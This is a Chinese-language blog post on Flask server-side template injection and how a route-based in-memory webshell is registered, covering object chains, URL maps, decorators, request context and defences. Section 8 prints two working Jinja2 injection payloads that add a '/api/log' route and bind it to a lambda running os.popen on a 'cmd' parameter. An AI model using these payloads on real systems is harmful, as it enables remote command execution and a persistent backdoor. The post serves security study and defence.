---
title: "Flask SSTI 与内存马机制分析"
date: 2025-11-05 00:00:00
cover: /images/flask-ssti-memory-shell/cover.png
disableNunjucks: true
categories:
  - Web 安全
tags:
  - Flask
  - SSTI
  - Python
  - 内存马
description: "从 Flask SSTI 分析路由型内存马的运行机制，梳理 URL 规则、视图映射、函数引用、装饰器和请求上下文。"
---

Flask 中的 SSTI 不仅可能执行模板表达式，还可能通过 Python 对象修改应用的路由和视图映射，使后续请求触发新增的处理函数。本文结合一组 SSTI 代码，分析路由型内存马的注册过程，以及其中涉及的函数引用、装饰器和请求上下文。

## 一、SSTI 入口与测试

### 1.1 模板注入入口

入口接收 `name` 参数，页面以 `Hello ...!` 的形式返回输入，可以从模板表达式开始测试。

SSTI（Server-Side Template Injection）指服务端将外部输入作为模板源码解析。

假设应用代码是：

```python
name = request.args.get("name", "guest")
return render_template_string("Hello " + name + "!")
```

此时用户输入先参与拼接，再交给模板引擎。如果输入包含模板语法，就可能改变模板执行行为。

相对地，下面的写法把输入作为数据传入：

```python
name = request.args.get("name", "guest")
return render_template_string("Hello {{ name }}!", name=name)
```

前者将输入拼入模板源码，后者使用固定模板，将输入作为变量值传入。

### 1.2 表达式测试

测试输入：

```text
?name={[7*7]}
```

页面原样返回 `Hello {[7*7]}!`。

默认 Jinja 表达式使用 `{{ ... }}`，`{[ ... ]}` 会被当作普通文本。测试应使用 `{{ 7 * 7 }}`，根据是否返回 `49` 判断表达式是否执行。自定义分隔符的环境需按实际配置测试。

默认 Jinja 的几种分隔符如下：

| 写法 | 用途 | 普通情况下的效果 |
| --- | --- | --- |
| `{{ 7 * 7 }}` | 表达式输出 | 输出 `49` |
| `{% if ... %}` | 控制语句 | 控制模板逻辑 |
| `{# 说明 #}` | 注释 | 注释部分不进入输出 |
| `{[7*7]}` | 非默认表达式写法 | 通常作为普通文本 |

分隔符也可以自定义，具体配置见 [Jinja 模板语法](https://jinja.palletsprojects.com/en/stable/templates/#synopsis)。

### 1.3 响应判断

测试中出现了三种响应：

- “渲染出来不一样”；
- “这样的东西我是不会给你渲染的”；
- “渲染出错了”。

这些提示对应应用的不同处理分支，执行结果仍需单独验证。

例如，“渲染出错了”还可能来自对象不存在、属性访问失败、运行时异常；“渲染出来不一样”也可能只是字符串检测的结果。

常见响应与判断依据如下：

| 响应现象 | 验证方向 |
| --- | --- |
| 输入原样返回 | 检查分隔符、模板构造方式及过滤逻辑 |
| 返回预期算术结果 | 确认该类表达式可被求值 |
| 返回统一提示语 | 检查处理分支和可观察的副作用 |
| 后续请求出现状态变化 | 验证修改内容、持续时间及进程范围 |

## 二、无回显与执行副作用

一次模板处理可以粗略拆成：

```text
接收输入 → 构造模板 → 编译/求值 → 得到结果 → 应用决定怎样响应
```

“是否执行”和“是否把执行结果返回给客户端”是两个不同问题。

举例来说，一个函数修改了列表，然后返回空字符串。客户端看不到明显变化，但列表已经改变。某个应用也可能在渲染完成后统一替换响应文字；这种做法不会自动撤销此前发生的修改。

Jinja 示例：

```python
from jinja2 import Environment

state = {"hits": 0}

def record_visit():
    state["hits"] += 1
    return ""

env = Environment()
result = env.from_string("{{ record_visit() }}").render(
    record_visit=record_visit
)

print(repr(result))   # ''
print(state["hits"])  # 1
```

渲染结果为空，但 `hits` 已经增加。对于无回显场景，可以通过后续请求或对象状态变化验证副作用。

应用若在渲染后统一替换响应，模板执行期间产生的状态修改仍可能保留。具体过滤发生在哪个阶段，需要结合应用实现判断。

命令调用没有输出时，应分别检查响应过滤、表达式语法、名称解析和命令执行错误。本地命令不一定涉及外部网络，不能仅凭无输出判断存在出站限制。

## 三、内存马的运行机制

### 3.1 进程内状态修改

在 Web 安全讨论中，“内存马”通常指攻击者把额外的处理逻辑放入正在运行的应用进程，并让后续请求能够触发它。

对 Flask 而言，值得关注的是应用对象持有的路由、视图、请求回调等状态。普通函数对象本身并不恶意；当其被未经授权地接入请求处理链，承担额外的命令执行、数据访问等能力时，才具有后门性质。

### 3.2 驻留与持久化

将代码写入 `app.py` 属于修改磁盘源码，与仅修改运行中对象的方式不同。

可以用下面的表区分：

| 形式 | 主要改变的位置 | 后续请求如何触发 | 重启后通常怎样 |
| --- | --- | --- | --- |
| 一次性的模板求值 | 当前调用过程 | 依赖再次进入该入口 | 当次调用结束，不自动留下新入口 |
| 文件型 WebShell | 磁盘文件 | Web 服务解释或加载该文件 | 文件还在时可能继续生效 |
| 修改应用源码 | 应用源文件 | 应用加载修改后的源码 | 取决于源码、发布和加载方式 |
| 进程内状态被修改 | 函数、映射、回调等运行状态 | 框架后续请求处理过程 | 仅内存中的改变通常随进程退出消失 |

“通常随进程退出消失”有前提：没有同时修改源码、启动配置或其他持久化位置，也没有在重启后重新触发注入。

即便没有新增后门文件，访问日志、错误日志、进程行为和内存快照仍可能留下证据。因此“无文件落地”不能推导为“无痕”或“无法检测”。

### 3.3 常见挂载位置

除了添加路由，还可以通过请求回调、响应处理和中间件等位置接入额外逻辑。共同点是让后续请求触发应用进程中的处理函数。

| 被改变的处理位置 | 大致怎样影响后续流程 | 和路由型的区别 |
| --- | --- | --- |
| URL 规则与视图映射 | 路径匹配到一个额外的视图 | 通常需要请求命中相应路径 |
| 请求前回调 | 在视图运行前执行额外逻辑 | 不一定需要新增 URL |
| 响应后处理回调 | 在构造响应时改变结果 | 关注的是响应处理阶段 |
| 错误处理逻辑 | 对特定异常走另一条处理分支 | 需要对应错误路径被触发 |
| WSGI 调用外层 | 先经过额外的中间层，再进入应用 | 挂载位置比具体视图更外层 |

各类实现涉及的对象、注册规则和版本限制不同。中间件在 WSGI 应用外层参与调用的关系，可参照 [Flask 对 Middleware 的说明](https://flask.palletsprojects.com/en/stable/lifecycle/#middleware)。

这里修改的是 Python 解释器中的函数、字典和回调引用，不涉及向其他操作系统进程写入机器码。

## 四、Python 对象链

### 4.1 模板上下文

Flask 会向模板上下文提供一些对象和辅助函数，例如 `config`、`url_for`，以及在请求上下文中可用的 `request`。模板能访问什么，也取决于应用额外传入了什么。[Flask 模板上下文](https://flask.palletsprojects.com/en/stable/templating/#standard-context)

因此，SSTI 的风险不止是“计算 `7 * 7`”：如果模板能接触到带有丰富行为的 Python 对象，就可能沿着对象关系访问更敏感的状态。

### 4.2 对象属性与全局字典

对象链中常见的属性如下：

| 名称 | 含义 | 容易误解的地方 |
| --- | --- | --- |
| `obj.__class__` | 对象所属的类 | 得到类不等于已经能够执行系统命令 |
| `Class.__init__` | 初始化方法相关对象 | 它不保证一定是带 `__globals__` 的 Python 函数 |
| `function.__globals__` | 该 Python 函数定义所在模块的全局字典 | 不是所有模块、所有局部变量的集合 |
| `__builtins__` | 某些命名空间中提供的内建对象入口 | 可能表现为模块或字典，不能混用访问写法 |

`__globals__` 指向函数定义所在模块的全局字典，具体语义见 [Python 用户定义函数](https://docs.python.org/3.12/reference/datamodel.html#user-defined-functions)。

在全局字典中查找 `__import__` 失败，可能只是该字典没有这个键。分析对象链时，需要逐步确认对象类型和可用属性。

同样，`url_for.__globals__` 是否包含 `os`、`request`、`current_app` 等名称，取决于具体版本的函数实现和导入关系，不是跨版本保证。

### 4.3 `eval` 的命名空间

`eval` 的第二个参数用于指定全局命名空间。

示例：

```python
namespace = {"marker": "demo-ok"}
handler = eval("lambda: marker", namespace)

print(handler())                  # demo-ok
print(handler.__globals__ is namespace)  # True
```

函数没有立即返回 `marker`，而是在被调用时从它关联的全局字典中查找。只要函数仍被引用，它关联的命名空间也可能继续被引用。

`eval` 与 `exec` 的作用不同：前者主要求值表达式，后者执行语句。函数调用和 `lambda` 都可以构成表达式，但不能把任意多行语句直接塞进 `eval`。此外，给 `eval` 一个字典不等于创建了安全沙箱。[Python 内建函数说明](https://docs.python.org/3.12/library/functions.html#eval)

## 五、Flask 路由映射

### 5.1 URL、endpoint 与视图函数

看一段正常的应用初始化代码：

```python
from flask import Flask

app = Flask(__name__)

def demo_view():
    return "demo-ok"

app.add_url_rule("/demo", endpoint="demo", view_func=demo_view)
```

对应关系如下：

- `/demo`：客户端请求的路径；
- `demo`：框架使用的端点标识，即 endpoint；
- `demo_view`：真正被调用的 Python 函数。

endpoint 不必等于路径，也不必等于函数名。没有显式指定时，Flask 通常从视图函数名推导 endpoint；蓝图还会影响端点命名。[Flask `add_url_rule` API](https://flask.palletsprojects.com/en/stable/api/#flask.Flask.add_url_rule)

### 5.2 规则匹配与请求分发

可以把路由过程理解成两次关联：

```text
/demo 这个路径
    ↓ 匹配 URL 规则
得到 endpoint = "demo"
    ↓ 按 endpoint 查找处理函数
app.view_functions["demo"]
    ↓
调用 demo_view()
    ↓
将返回值转换为 HTTP 响应
```

Werkzeug 的 `Map` 和 `Rule` 负责规则及其匹配；规则的匹配结果包含 endpoint 和路径参数。Flask 再利用这些结果分发请求。[Werkzeug 路由说明](https://werkzeug.palletsprojects.com/en/stable/routing/#quickstart)

在 Flask 中，相关运行状态主要包括：

| 位置 | 主要职责 | 概念上的示例 |
| --- | --- | --- |
| `app.url_map` | 保存、匹配 URL 规则 | `/demo` 对应端点 `demo` |
| `app.view_functions` | 以 endpoint 查找视图函数 | `demo` 对应 `demo_view` |

两边需要配合。只让路径匹配到一个端点，却没有对应的视图函数，请求分发可能失败；只保存函数，却没有能匹配到它的路径，普通请求也不会自动找到它。Flask 的实际分发过程可参照 [固定版本的 `dispatch_request` 实现](https://github.com/pallets/flask/blob/3.1.2/src/flask/app.py)。

### 5.3 映射示例

下面的代码全部发生在第一次请求之前，返回内容也是固定标记：

```python
from flask import Flask
from werkzeug.routing import Rule

app = Flask(__name__)

def marker_view():
    return "marker-ok"

app.url_map.add(Rule("/marker", endpoint="marker", methods=["GET"]))
app.view_functions["marker"] = marker_view

with app.test_client() as client:
    response = client.get("/marker")
    assert response.get_data(as_text=True) == "marker-ok"
```

示例分别操作规则表和函数表。正常应用初始化时应使用 `add_url_rule` 完成注册。

## 六、Python 装饰器

Flask 的 `@app.route` 和 `@setupmethod` 都使用了装饰器，分别承担路由注册和调用检查的作用。

### 6.1 函数对象

Python 里的函数也是对象。写 `hello` 是拿到这个函数，写 `hello()` 才是调用它。

```python
def hello():
    return "hello"

saved = hello
print(saved is hello)  # True
print(saved())        # hello
```

`app.view_functions` 保存的是函数对象，Flask 在请求分发时调用它。

装饰器接收函数，并返回可调用对象。

### 6.2 函数包装

```python
from functools import wraps

def trace(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("执行前")
        result = func(*args, **kwargs)
        print("执行后")
        return result
    return wrapper

def hello(name):
    return "hello " + name

hello = trace(hello)
print(hello("k1ne"))
```

正常调用时，会先打印“执行前”，调用原函数，再打印“执行后”，最后由外层 `print` 输出返回值。

包装过程如下：

1. `trace(hello)` 收到的是原来的 `hello` 函数对象；
2. `trace` 创建了 `wrapper`，但没有在这一步调用原函数；
3. `return wrapper` 把包装函数交给外面；
4. `hello = ...` 让 `hello` 这个名称改为指向包装函数；
5. 后面调用 `hello("k1ne")`，实际先进入 `wrapper`。

`*args` 收集位置参数，`**kwargs` 收集关键字参数，包装函数再将参数传给原函数。`return result` 将原函数的结果返回给调用者；省略它时，包装函数默认返回 `None`。

原函数抛出异常时，“执行后”不会执行。需要保证执行的清理操作应放在 `finally` 中。

### 6.3 装饰器语法

```python
@trace
def hello(name):
    return "hello " + name
```

在这个例子里，可以按下面的形式理解：

```python
def hello(name):
    return "hello " + name

hello = trace(hello)
```

装饰器在执行函数定义时应用，包装函数的函数体在调用时执行。模块顶层的函数定义通常在模块导入期间执行。[Python 函数定义与装饰器](https://docs.python.org/3.12/reference/compound_stmts.html#function-definitions)

### 6.4 闭包与引用

`wrapper` 使用了外层作用域的 `func`，形成闭包。外层函数返回后，`wrapper` 仍能访问这个绑定。

只要 `wrapper` 仍被引用，它持有的 `func` 引用就可以继续存在。

函数被长期存在的对象持有，可以跨越单次调用存活。路由型内存马也依赖这种引用关系。

闭包与 `__globals__` 的名称查找位置不同：`wrapper` 捕获外层局部名称，涉及闭包；前面 `eval("lambda: marker", namespace)` 的例子里，`marker` 是通过函数关联的全局字典查找的。两种引用关系都可能延长对象存活时间，查找位置却不同。

### 6.5 函数元数据

装饰器直接返回 `wrapper` 时，函数的 `__name__` 会变成 `wrapper`，可能影响依赖函数名的注册逻辑。

`@wraps(func)` 会保留原函数的一些元数据，并提供 `__wrapped__` 关联。Flask 在没有指定 endpoint 时通常使用视图函数名，如果多个包装函数都叫 `wrapper`，就可能发生注册名称冲突。

`functools.wraps` 负责保留元数据和函数关联，不提供鉴权能力。[Python `functools.wraps`](https://docs.python.org/3.12/library/functools.html#functools.wraps)

### 6.6 路由装饰器

路由装饰器示例：

```python
@app.route("/demo")
def demo():
    return "demo-ok"
```

`app.route("/demo")` 先被调用，返回一个装饰器；这个装饰器再接收 `demo` 函数。

可以拆成：

```python
def demo():
    return "demo-ok"

register_demo = app.route("/demo")
demo = register_demo(demo)
```

Flask 的路由装饰器完成注册后返回原视图函数，不会像 `trace` 一样增加包装层。后续调用视图时也不会重新注册路由。

`@app.route` 注册视图，`@trace` 包装调用，`@setupmethod` 则在设置方法被调用时检查应用状态。

### 6.7 装饰器顺序

假设希望 HTTP 请求进入视图前先经过 `trace`：

```python
@app.route("/demo")
@trace
def demo():
    return "demo-ok"
```

先应用 `trace`，再将包装函数交给路由装饰器注册，等价于：

```python
demo = trace(demo)
demo = app.route("/demo")(demo)
```

反过来：

```python
@trace
@app.route("/other")
def other():
    return "other-ok"
```

则是先把原函数注册给 Flask，再让模块中的 `other` 名称指向包装函数。此时模块里直接调用 `other()` 可能经过 `trace`，但 Flask 保存的仍可能是之前的原函数。

装饰器顺序决定了 Flask 最终保存原函数还是包装函数。

## 七、`setupmethod` 与注册限制

### 7.1 注册时机

正常应用通常先创建对象、注册路由和回调，再开始处理请求。如果服务已经处理过请求，再临时改变注册状态，多 worker 环境就可能出现状态不一致：一个 worker 知道新规则，其他 worker 不知道。

Flask 会对部分设置接口检查调用时机。在应用处理过请求后调用这些接口，会触发设置阶段已结束的报错。该检查用于约束初始化流程。[Flask 应用生命周期](https://flask.palletsprojects.com/en/stable/lifecycle/#application-setup)

### 7.2 版本差异

`setupmethod` 并非 Flask 3.0 才引入，不同版本的检查条件也有差异：

- Flask 2.1.3 源码中已经存在 `setupmethod`，其文档还说明了当时与调试模式有关的检查语义。[2.1.3 源码](https://github.com/pallets/flask/blob/2.1.3/src/flask/scaffold.py)
- Flask 2.2.5 的 `_check_setup_finished` 已经会检查应用是否处理过首个请求。[2.2.5 源码](https://github.com/pallets/flask/blob/2.2.5/src/flask/app.py)
- 在较新的实现中，`setupmethod` 包装器在调用设置方法前执行相应检查。[3.1.2 源码](https://github.com/pallets/flask/blob/3.1.2/src/flask/sansio/scaffold.py)

这类报错说明调用受到了注册时机限制，不能单凭报错确定 Flask 版本。

![设置方法在首个请求后调用时的报错](/images/flask-ssti-memory-shell/image.png)

*图 1：首个请求后的设置方法调用报错。*

### 7.3 内部状态修改

路由注册可以拆成添加 URL 规则和绑定视图函数两部分。

高层接口的检查不会自动冻结底层对象。直接修改内部结构仍可能影响运行状态，但缓存、并发和 worker 差异会影响结果。

## 八、路由型内存马代码分析

下面两段代码分别修改 URL 规则和视图映射。对象链依赖具体 Flask 版本、模板上下文及访问限制，分析时需确认各名称实际指向的对象。

### 8.1 添加 URL 规则

```jinja2
{{ url_for.__globals__['__builtins__']['eval'](
    "app.url_map.add(app.url_rule_class('/api/log', methods=['GET'], endpoint='api_log'))",
    {'app': url_for.__globals__['current_app']}
) }}
```

这段代码修改应用的 URL 规则：

1. 通过对象链取得求值入口；
2. 把 `app` 这个名称放进求值使用的字典；
3. 创建路径为 `/api/log`、端点为 `api_log` 的规则；
4. 将规则交给应用持有的 URL 映射对象。

添加规则后，还需要为 `api_log` 绑定视图函数。

### 8.2 绑定视图函数

```jinja2
{{ url_for.__globals__['__builtins__']['eval'](
    "app.view_functions.update({'api_log': lambda: __import__('os').popen(request.args.get('cmd')).read()})",
    {
        'request': url_for.__globals__['request'],
        'app': url_for.__globals__['current_app']
    }
) }}
```

这段代码让 `app.view_functions['api_log']` 指向新建的函数。后续请求进入该视图时，函数读取 `cmd` 参数，执行命令并返回输出。

相关细节：

- `dict.update(...)` 修改字典后返回 `None`，状态修改与返回值需要分别判断。
- `lambda` 创建时不会立刻执行函数体。函数体在后续请求真正调用它时才运行。
- `request` 在这个字典中提供名称绑定；函数后续解析名称时，会使用创建它时关联的全局字典。

### 8.3 跨请求驻留

重点在对象的引用关系：

```text
仍在运行的 Flask 应用
    ├── URL 映射保存路径与 endpoint
    └── view_functions 保存 endpoint 与函数的关联
                               ↓
                       函数继续引用其全局字典
```

模板求值结束，并不意味着它创建的所有对象都会马上消失。只要应用的长期对象仍引用那个函数，函数就可能在之后被调用。

这解释了“应用进程内驻留”与“仅在当前表达式里执行一次”的区别。它不保证跨进程、跨重启继续生效。

### 8.4 效果验证

“渲染出来不一样”只能作为响应线索。注册是否生效，需要通过后续请求验证。

验证内容包括：

1. 修改前，预期路径的响应是什么；
2. 修改后，新请求是否进入新增的处理逻辑；
3. 相同条件下结果能否重复观察；
4. 重启或切换 worker 后，结果是否发生变化。

验证重点是新路径能否进入绑定的处理函数，以及状态修改能否在后续请求中持续观察。整体流程如下：

![模板入口、进程内状态与后续请求](/images/flask-ssti-memory-shell/image-2.png)

*图 2：模板求值与后续请求的处理流程。*

## 九、请求上下文

### 9.1 上下文代理

Flask 中的 `request` 和 `current_app` 通常通过上下文代理暴露。它们不是所有用户共享的同一个请求对象：`request` 会在合适的上下文里解析到当前请求。

因此，如果函数保存的是代理对象，并在后续请求中访问它，可能取得后续请求的数据；如果保存的是某次请求的实际对象，则可能一直指向旧请求。两者不能混为一谈。

脱离请求上下文访问请求数据，通常会遇到 `Working outside of request context`。现代 Flask 的这套机制基于 `contextvars` 和 Werkzeug 的代理实现。[Flask 请求上下文](https://flask.palletsprojects.com/en/stable/reqcontext/)

### 9.2 旧接口兼容性

`_request_ctx_stack.top.request` 是旧实现中从上下文栈取得请求对象的写法，依赖 Flask 内部接口。

Flask 的上下文实现和旧接口经过多次调整。例如 2.3 移除了旧栈对象的 `push`、`pop`，并暂时保留 `top` 供迁移；旧示例是否还能运行，必须结合实际版本检查。`before_first_request` 也已在 2.3 移除。[Flask 版本变更记录](https://flask.palletsprojects.com/en/stable/changes/#version-2-3-0)

本地实验可以用以下命令记录依赖版本：

```bash
python -c "from importlib.metadata import version; print({p: version(p) for p in ['Flask', 'Jinja2', 'Werkzeug']})"
```

该命令输出的是当前 Python 环境的依赖版本。

## 十、请求钩子与扩展点

Flask 的扩展点覆盖请求处理的不同阶段：

| 扩展点 | 主要时机或用途 | 需要记住的区别 |
| --- | --- | --- |
| `before_request` | 视图执行前 | 返回非 `None` 值可提前形成响应 |
| `after_request` | 对响应进行后处理 | 接收并返回响应对象，不代表在所有异常路径都成功执行 |
| `teardown_request` | 请求上下文清理阶段 | 主要做清理，不是替换响应正文的常规入口 |
| `context_processor` | 为模板补充上下文 | 返回字典，不是所有请求都会渲染模板 |
| `template_filter` | 提供模板过滤器 | 通常由模板中的过滤器调用触发 |
| `errorhandler` | 处理匹配的异常或 HTTP 错误 | 仅在对应错误处理路径上起作用 |

回调的执行时机与注册时机不同。即使回调会在每次请求中执行，其注册动作仍可能受到设置阶段检查。[Flask API](https://flask.palletsprojects.com/en/stable/api/)

![请求钩子与装饰器的讨论](/images/flask-ssti-memory-shell/image-1.png)

*图 3：请求钩子与装饰器参考示例。*

## 十一、本地实验

完整实验脚本见 [`examples/验证关键机制.py`](/downloads/flask-ssti-memory-shell/验证关键机制.py)，覆盖以下机制：

1. 默认 Jinja 语法能计算表达式，而非默认语法可原样保留；
2. 将输入作为数据传入时，不会自动递归解析其中的模板表达式；
3. 模板返回空字符串时，函数仍可能修改普通 Python 对象；
4. 函数与全局字典的引用关系；
5. 固定路径、endpoint 和固定返回值函数之间如何关联；
6. 处理首个请求后，再调用正常路由注册 API 会遇到时机检查；
7. 同一个上下文代理在两个独立请求里读取各自的参数；
8. 包装函数如何保留原函数引用，装饰器叠加顺序怎样影响 Flask 实际调用的对象。

运行方式：

```bash
python examples/验证关键机制.py
```

实验环境为 Flask 3.1.3、Jinja2 3.1.6、Werkzeug 3.1.7，结果见同目录的 `验证结果.txt`。实验用于验证上述基础机制。

## 十二、常见问题

### 12.1 多 worker 状态差异

如果服务使用多个 worker，修改某个进程的状态不会天然同步到其他进程。后续请求落在不同 worker 上，可能得到不同结果。

排查时还应检查路径、请求方法、反向代理、端点绑定和进程重启情况。

### 12.2 异常与部分修改

操作可能分多步完成。前面的修改已经发生，后面的名称查找或响应构造却报错，就可能留下部分状态。

同样，得到 200 或统一成功提示，也不保证每一步都已完成。HTTP 状态、页面文案和业务副作用应分别验证。

### 12.3 状态码分析

- `404`：通常需要检查路径是否匹配到规则；
- `405`：路径可能存在，但请求方法不受支持；
- 处理函数异常：规则可能已匹配，错误发生在进一步分发或执行阶段。

应用自定义错误处理时，还需结合响应内容和服务端日志定位。

### 12.4 进程权限

命令执行通常继承应用进程的权限，`whoami` 的结果取决于应用运行身份。容器内的 `root` 也不直接等价于宿主机权限。

### 12.5 对象生命周期

函数被应用对象引用时可以跨请求存活。清空引用、重建应用对象、worker 退出或代码重载，都可能使相关状态失效。

## 十三、防御措施

### 13.1 固定模板结构

将用户输入作为数据交给固定模板，而不是先拼入模板源码。自动 HTML 转义解决的是输出中的 HTML 特殊字符处理，不能替代模板源码的信任边界。

对于本来就要运行用户模板的业务，需要单独设计权限和资源边界。Jinja 的沙箱能限制某些属性访问和操作，但仍需控制可传入的对象、异常及资源消耗，不能把它理解成完整隔离环境。[Jinja Sandbox](https://jinja.palletsprojects.com/en/stable/sandbox/)

### 13.2 运行状态检查

文件扫描可以检查磁盘产物，但这类问题还涉及运行中的对象。排查时可把异常请求、错误日志，与应用的规则、视图函数、回调及其来源进行关联分析。

一个名字不熟悉的 endpoint 并不自动等于后门：插件、蓝图、扩展也会注册处理函数。更有价值的是比较可信初始化后的基线，解释新增对象从哪里来、何时出现、能触发什么行为。

### 13.3 漏洞修复与恢复

重启可能清除当前进程内的临时修改，但若不修复模板注入入口，问题仍可能再次发生。若曾有敏感信息暴露，还需独立评估相关凭据和数据的影响。

## 十四、总结

```text
外部输入进入模板源码
    ↓
模板在当前环境中接触到可操作的 Python 对象
    ↓
一次求值可能改变应用持有的运行状态
    ↓
后续请求沿框架分发链触发新的处理逻辑
```

路由型内存马依赖 Flask 应用持有的 URL 规则和视图函数映射。模板求值修改这些对象后，新函数可通过引用关系跨请求存活，并在当前请求上下文中读取参数。实际效果受对象访问范围、框架版本、进程生命周期和 worker 分布影响，需分别验证。

## 参考资料

- [Jinja 模板语法](https://jinja.palletsprojects.com/en/stable/templates/#synopsis)
- [Flask 应用生命周期](https://flask.palletsprojects.com/en/stable/lifecycle/)
- [Flask API](https://flask.palletsprojects.com/en/stable/api/)
- [Python 函数与装饰器](https://docs.python.org/3.12/reference/compound_stmts.html#function-definitions)
- [Jinja2 无回显 SSTI](https://www.cnblogs.com/shinnylbz/p/18572680)
- [SSTI 无回显几种利用方式](https://xz.aliyun.com/news/13976)

